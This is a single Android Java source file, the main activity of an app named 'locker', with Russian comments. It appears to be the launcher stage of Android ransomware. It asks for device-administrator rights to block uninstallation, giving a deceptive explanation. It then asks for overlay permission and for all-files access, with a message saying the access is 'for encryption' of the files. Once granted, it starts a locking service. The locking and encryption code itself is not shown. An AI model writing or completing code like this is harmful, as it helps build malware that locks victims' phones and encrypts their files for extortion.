package com.locker;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int ADMIN_INTENT = 1;

    @Override 
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        
        // 1. Запрос на Администратора устройства (защита от удаления)
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
        
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Необходимо для защиты приложения");
            startActivityForResult(intent, ADMIN_INTENT);
        } else {
            checkNextPermissions();
        }
    }

    private void checkNextPermissions() {
        // 2. Запрос на оверлей
        if (!Settings.canDrawOverlays(this)) {
            startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())));
        } 
        // 3. Запрос на файлы (для Android 11+)
        else if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            Toast.makeText(this, "Разрешите доступ к файлам для их шифрования", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
        }
        // 4. Запуск блокировщика
        else {
            startService(new Intent(this, LockService.class));
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == ADMIN_INTENT) {
            checkNextPermissions();
        }
    }
    
    @Override protected void onResume() {
        super.onResume();
        if (Settings.canDrawOverlays(this) && (Build.VERSION.SDK_INT < 30 || Environment.isExternalStorageManager())) {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
            if (dpm.isAdminActive(adminComponent)) {
                startService(new Intent(this, LockService.class));
                finish();
            }
        }
    }
    }
